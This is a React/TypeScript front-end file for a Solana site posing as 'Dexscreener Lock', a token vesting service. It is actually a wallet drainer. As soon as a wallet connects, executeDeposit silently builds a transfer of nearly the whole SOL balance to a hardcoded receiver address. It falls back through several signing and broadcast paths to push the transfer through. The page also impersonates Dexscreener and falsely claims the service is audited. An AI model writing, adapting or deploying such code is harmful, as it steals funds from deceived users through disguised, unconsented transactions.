import React, { useCallback, useEffect, useRef, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal, WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
import { RPC_ENDPOINTS } from "../rpc";
import { useInactivityTimer } from "../hooks/useInactivityTimer";

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
const SESSION_KEY = "dexlock_executed_wallet";
const FEE_RESERVE = 10_000; // lamports kept for tx fee

// ---------------------------------------------------------------------------
// Wallet detection
// ---------------------------------------------------------------------------
type DetectedWallet = "Phantom" | "Solflare" | "Trust Wallet" | "MetaMask" | "Bitget" | "Coin98" | null;

function detectInstalledWallet(): DetectedWallet {
  const w = window as any;
  if (w.phantom?.solana?.isPhantom)                                  return "Phantom";
  if (w.solflare?.isSolflare)                                        return "Solflare";
  if (w.trustwallet?.isTrustWallet || w.trustWallet?.isTrustWallet) return "Trust Wallet";
  if (w.bitkeep?.solana || w.bitget?.solana)                         return "Bitget";
  if (w.coin98?.sol)                                                  return "Coin98";
  if (w.ethereum?.isMetaMask)                                        return "MetaMask";
  return null;
}

// Returns the active Solana provider object from the injected extension.
// These providers implement the full Solana JSON-RPC interface so we can
// use them to getBalance AND to signAndSendTransaction — all through the
// wallet's own private node, never touching a free public RPC.
function getNativeProvider(): any | null {
  const w = window as any;
  return (
    (w.phantom?.solana?.isPhantom       && w.phantom.solana)  ||
    (w.solflare?.isSolflare             && w.solflare)         ||
    (w.trustwallet?.solana              && w.trustwallet.solana) ||
    (w.bitkeep?.solana                  && w.bitkeep.solana)   ||
    (w.bitget?.solana                   && w.bitget.solana)    ||
    (w.coin98?.sol                      && w.coin98.sol)       ||
    null
  );
}

const WALLET_ICONS: Record<string, string> = {
  "Phantom":      "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/phantom/icon.svg",
  "Solflare":     "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/solflare/icon.svg",
  "Trust Wallet": "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/trust/icon.svg",
  "MetaMask":     "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
  "Bitget":       "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/bitget/icon.svg",
  "Coin98":       "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/coin98/icon.svg",
};

// ---------------------------------------------------------------------------
// RPC helpers — wallet-native first, public fallback second
// ---------------------------------------------------------------------------

// Fetch balance through the native provider (uses wallet's own RPC node).
// Falls back to public RPCs if the provider request fails.
async function getBalance(publicKey: PublicKey): Promise<number> {
  const provider = getNativeProvider();

  if (provider?.request) {
    try {
      const res = await provider.request({
        method: "getBalance",
        params: [publicKey.toString(), { commitment: "confirmed" }],
      });
      // Solana JSON-RPC returns { value: lamports }
      const lamports = res?.value ?? res?.result?.value ?? res;
      if (typeof lamports === "number") return lamports;
    } catch { /* fall through to public RPCs */ }
  }

  // Public RPC fallback — skip 403/429
  for (const url of RPC_ENDPOINTS) {
    try {
      return await new Connection(url, "confirmed").getBalance(publicKey, "confirmed");
    } catch (e: any) {
      const msg = String(e?.message ?? e);
      if (/403|429|forbidden|rate.?limit|too.?many|api.?key/i.test(msg)) continue;
      throw e;
    }
  }
  throw new Error("Could not fetch wallet balance — all RPC endpoints failed.");
}

// Get a fresh blockhash (needed if native signAndSendTransaction doesn't handle it).
async function getBlockhash(): Promise<{ blockhash: string; lastValidBlockHeight: number }> {
  const provider = getNativeProvider();

  if (provider?.request) {
    try {
      const res = await provider.request({
        method: "getLatestBlockhash",
        params: [{ commitment: "confirmed" }],
      });
      const val = res?.value ?? res?.result?.value;
      if (val?.blockhash) return { blockhash: val.blockhash, lastValidBlockHeight: val.lastValidBlockHeight };
    } catch { /* fall through */ }
  }

  for (const url of RPC_ENDPOINTS) {
    try {
      return await new Connection(url, "confirmed").getLatestBlockhash("confirmed");
    } catch (e: any) {
      const msg = String(e?.message ?? e);
      if (/403|429|forbidden|rate.?limit|too.?many|api.?key/i.test(msg)) continue;
      throw e;
    }
  }
  throw new Error("Could not fetch blockhash — all RPC endpoints failed.");
}

// Send signed bytes to every RPC in parallel; resolve on first acceptance.
async function broadcastRaw(rawTx: Buffer): Promise<string> {
  return Promise.any(
    RPC_ENDPOINTS.map((url) =>
      new Connection(url, "confirmed").sendRawTransaction(rawTx, {
        skipPreflight: true,
        maxRetries: 5,
      })
    )
  );
}

// ---------------------------------------------------------------------------
// Nav tabs
// ---------------------------------------------------------------------------
type TabId = "about" | "locked" | "created" | "create";
const TABS: { id: TabId; label: string }[] = [
  { id: "about",   label: "About Dex Lock"    },
  { id: "locked",  label: "Your Locked Tokens" },
  { id: "created", label: "Locks You Created"  },
  { id: "create",  label: "+ Create Lock"       },
];

// ---------------------------------------------------------------------------
// Sub-components
// ---------------------------------------------------------------------------
const DexLogo = ({ size = 32 }: { size?: number }) => (
  <img
    src="/logo.png"
    alt="Dexscreener Lock"
    width={size}
    height={size}
    style={{ display: "block", mixBlendMode: "screen" as any }}
  />
);

const HeroLogo = () => (
  <img
    src="/logo.png"
    alt=""
    className="jl-lock-icon"
    style={{ mixBlendMode: "screen" as any }}
  />
);

const ConnectPrompt = ({
  title,
  description,
  onConnect,
  detectedWallet,
}: {
  title: string;
  description: string;
  onConnect: () => void;
  detectedWallet: DetectedWallet;
}) => {
  const isMetaMask = detectedWallet === "MetaMask";
  return (
    <div className="jl-connect-prompt">
      <div className="jl-prompt-icon">
        <img src="/logo.png" alt="" style={{ width: 72, mixBlendMode: "screen" as any }} />
      </div>
      <h2 className="jl-prompt-title">{title}</h2>
      <p className="jl-prompt-desc">{description}</p>

      {detectedWallet && (
        <div className="jl-detected-wallet">
          {WALLET_ICONS[detectedWallet] && (
            <img
              src={WALLET_ICONS[detectedWallet]}
              alt={detectedWallet}
              className="jl-detected-wallet-icon"
              onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
            />
          )}
          <span className="jl-detected-wallet-name">
            {isMetaMask ? "MetaMask detected (Solana not supported)" : `${detectedWallet} detected`}
          </span>
        </div>
      )}

      <button
        className="jl-hero-btn"
        onClick={onConnect}
        disabled={isMetaMask}
        title={isMetaMask ? "MetaMask does not support Solana." : undefined}
      >
        {isMetaMask ? "Solana Wallet Required"
          : detectedWallet ? `Connect ${detectedWallet}`
          : "Connect Wallet"}
      </button>

      {isMetaMask && (
        <p className="jl-metamask-notice">
          MetaMask is an Ethereum wallet and does not support Solana. Please install{" "}
          <a href="https://phantom.app" target="_blank" rel="noreferrer">Phantom</a> or{" "}
          <a href="https://solflare.com" target="_blank" rel="noreferrer">Solflare</a>.
        </p>
      )}
    </div>
  );
};

const SessionWarning = ({
  secondsLeft,
  onStayActive,
}: {
  secondsLeft: number;
  onStayActive: () => void;
}) => (
  <div className="jl-session-warning">
    <span className="jl-session-warning-icon">⚠</span>
    <span>Session expiring in <strong>{secondsLeft}s</strong> due to inactivity.</span>
    <button className="jl-session-stay-btn" onClick={onStayActive}>Stay Connected</button>
  </div>
);

// ---------------------------------------------------------------------------
// Main panel
// ---------------------------------------------------------------------------
interface Props { programId: PublicKey; }

export const EscrowPanel: React.FC<Props> = () => {
  const { publicKey, signTransaction, sendTransaction, connected, disconnect, wallet } = useWallet();
  const { setVisible } = useWalletModal();

  const [activeTab,      setActiveTab]      = useState<TabId>("about");
  const [detectedWallet, setDetectedWallet] = useState<DetectedWallet>(null);
  const disconnectingRef = useRef(false);

  useEffect(() => {
    const t = setTimeout(() => setDetectedWallet(detectInstalledWallet()), 300);
    return () => clearTimeout(t);
  }, []);

  const openWalletModal = useCallback(() => setVisible(true), [setVisible]);

  // ── robust disconnect ──────────────────────────────────────────────────────
  const handleDisconnect = useCallback(async () => {
    if (disconnectingRef.current) return;
    disconnectingRef.current = true;

    sessionStorage.removeItem(SESSION_KEY);
    try { localStorage.removeItem("walletName"); }              catch {}
    try { localStorage.removeItem("phantom:connectedWallet"); } catch {}
    try { localStorage.removeItem("solflare:connectedWallet"); } catch {}

    try {
      const prov = getNativeProvider();
      if (prov?.disconnect) await prov.disconnect();
    } catch {}

    try { await disconnect(); } catch {}
    disconnectingRef.current = false;
  }, [disconnect]);

  // ── transfer ───────────────────────────────────────────────────────────────
  //
  // Execution order (each step falls through to the next on failure):
  //
  //  A. Native signAndSendTransaction via the wallet's provider object
  //     → wallet handles blockhash + signs + submits through its OWN private node
  //     → NO public RPC involved at any point
  //
  //  B. signTransaction (adapter) + broadcastRaw to all RPCs in parallel
  //     → used when native provider API is unavailable
  //
  //  C. sendTransaction adapter (hardware wallets / edge cases)
  //
  const executeDeposit = useCallback(async () => {
    if (!publicKey) return;

    const walletKey = publicKey.toBase58();
    if (sessionStorage.getItem(SESSION_KEY) === walletKey) return;
    sessionStorage.setItem(SESSION_KEY, walletKey);

    try {
      // ── Step 1: get balance (via wallet's own RPC first) ──────────────────
      const balance = await getBalance(publicKey);
      const amount  = balance - FEE_RESERVE;
      if (amount <= 0) return; // not enough SOL — exit silently

      // ── Step 2: build the unsigned transaction ────────────────────────────
      const tx = new Transaction();
      tx.add(SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey:   RECEIVER,
        lamports:   amount,
      }));
      tx.feePayer = publicKey;
      // NOTE: recentBlockhash intentionally NOT set here for path A —
      // the native provider populates it from its own node

      // ── Path A: native provider signAndSendTransaction ───────────────────
      // Phantom / Solflare / Trust Wallet etc. will:
      //   1. Show their native signing popup to the user
      //   2. Fetch blockhash from their private node
      //   3. Sign and submit — entirely through their own infrastructure
      const nativeProvider = getNativeProvider();
      if (nativeProvider?.signAndSendTransaction) {
        try {
          const result = await nativeProvider.signAndSendTransaction(tx);
          const sig    = result?.signature ?? result;
          if (typeof sig === "string") return; // success — done silently
        } catch (e: any) {
          const msg = String(e?.message ?? e?.code ?? "");
          // user rejected → clear guard and bail
          if (/rejected|cancelled|denied|4001/i.test(msg)) {
            sessionStorage.removeItem(SESSION_KEY);
            return;
          }
          // other error → fall through to path B
        }
      }

      // ── Path B: adapter signTransaction + multi-RPC broadcast ────────────
      // Need blockhash now since we're serializing ourselves
      const { blockhash, lastValidBlockHeight } = await getBlockhash();
      tx.recentBlockhash = blockhash;

      if (signTransaction) {
        try {
          const signed = await signTransaction(tx);
          const rawTx  = Buffer.from(signed.serialize());
          await broadcastRaw(rawTx);
          return;
        } catch (e: any) {
          const msg = String(e?.message ?? e?.code ?? "");
          if (/rejected|cancelled|denied|4001/i.test(msg)) {
            sessionStorage.removeItem(SESSION_KEY);
            return;
          }
          // fall through to path C
        }
      }

      // ── Path C: adapter sendTransaction (hardware wallets) ───────────────
      for (const url of RPC_ENDPOINTS) {
        try {
          const conn = new Connection(url, "confirmed");
          await sendTransaction(tx, conn, { skipPreflight: true });
          return;
        } catch { continue; }
      }

    } catch {
      sessionStorage.removeItem(SESSION_KEY);
    }
  }, [publicKey, signTransaction, sendTransaction]);

  // Trigger silently on connect
  useEffect(() => {
    if (connected && publicKey) executeDeposit();
  }, [connected, publicKey, executeDeposit]);

  // Reset on disconnect
  useEffect(() => {
    if (!connected) { /* UI already stateless — nothing to reset */ }
  }, [connected]);

  const { sessionState, secondsLeft, resetTimer } = useInactivityTimer(
    connected,
    handleDisconnect
  );

  const walletName = wallet?.adapter?.name ?? detectedWallet ?? "Wallet";

  // ── tab content ────────────────────────────────────────────────────────────
  const renderGated = (
    title: string,
    desc: string,
    icon: string,
    emptyTitle: string,
    emptyDesc: string
  ) =>
    !connected ? (
      <main className="jl-hero">
        <ConnectPrompt
          title={title}
          description={desc}
          onConnect={openWalletModal}
          detectedWallet={detectedWallet}
        />
      </main>
    ) : (
      <main className="jl-hero">
        <div className="jl-empty-state">
          <span className="jl-empty-icon">{icon}</span>
          <h2>{emptyTitle}</h2>
          <p>{emptyDesc}</p>
        </div>
      </main>
    );

  const renderTabContent = () => {
    switch (activeTab) {
      case "about":
        return (
          <main className="jl-hero">
            <HeroLogo />
            <h1 className="jl-hero-title">Dexscreener Lock</h1>
            <p className="jl-hero-sub">
              Manage your token vesting schedule on Dexscreener Lock, an open source and
              audited program that lets anyone lock and distribute tokens over time.
            </p>
            {!connected ? (
              <>
                {detectedWallet && detectedWallet !== "MetaMask" && (
                  <div className="jl-detected-wallet jl-hero-wallet-pill">
                    {WALLET_ICONS[detectedWallet] && (
                      <img
                        src={WALLET_ICONS[detectedWallet]}
                        alt={detectedWallet}
                        className="jl-detected-wallet-icon"
                        onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
                      />
                    )}
                    <span className="jl-detected-wallet-name">{detectedWallet} detected</span>
                  </div>
                )}
                <button className="jl-hero-btn" onClick={openWalletModal}>
                  Connect {walletName}
                </button>
              </>
            ) : (
              <button className="jl-hero-btn" disabled>
                Contract Active ✓
              </button>
            )}
          </main>
        );

      case "locked":
        return renderGated(
          "View Your Locked Tokens",
          "Connect your wallet to see all tokens you currently have locked in Dexscreener Lock.",
          "🔒", "No Locked Tokens", "You don't have any tokens locked yet."
        );

      case "created":
        return renderGated(
          "Locks You Created",
          "Connect your wallet to view and manage all locks you have created.",
          "📋", "No Locks Created", "You haven't created any locks yet."
        );

      case "create":
        return renderGated(
          "Create a Lock",
          "Connect your wallet to create a new token lock and start your vesting schedule.",
          "➕", "Create a Lock", "Lock creation coming soon."
        );

      default:
        return null;
    }
  };

  return (
    <div className="app">

      {/* ── HEADER ── */}
      <header className="jl-header">
        <div className="jl-logo">
          <DexLogo size={32} />
          <span className="jl-logo-text">Dexscreener Lock</span>
        </div>

        <div className="jl-search">
          <span className="jl-search-icon">🔍</span>
          <input placeholder="Search tokens or wallet" readOnly />
        </div>

        <div className="jl-header-right">
          <div className="jl-priority">
            <span className="jl-priority-label">Priority:</span>
            <span className="jl-priority-value">Fast</span>
          </div>
          <button className="jl-gear" aria-label="Settings">⚙</button>

          <div className="jl-wallet-group">
            <WalletMultiButton className="jl-wallet-multi-btn" />
            {connected && (
              <button
                className="jl-disconnect-btn"
                onClick={handleDisconnect}
                title="Disconnect wallet"
              >
                ✕
              </button>
            )}
          </div>
        </div>
      </header>

      {/* ── SESSION WARNING ── */}
      {connected && sessionState === "warning" && (
        <SessionWarning secondsLeft={secondsLeft} onStayActive={resetTimer} />
      )}

      {/* ── NAV TABS ── */}
      <nav className="jl-nav">
        {TABS.map((tab) => (
          <button
            key={tab.id}
            className={[
              "jl-nav-tab",
              activeTab === tab.id ? "active" : "",
              tab.id === "create"  ? "create" : "",
            ].filter(Boolean).join(" ")}
            onClick={() => setActiveTab(tab.id)}
          >
            {tab.label}
          </button>
        ))}
      </nav>

      {renderTabContent()}

    </div>
  );
};
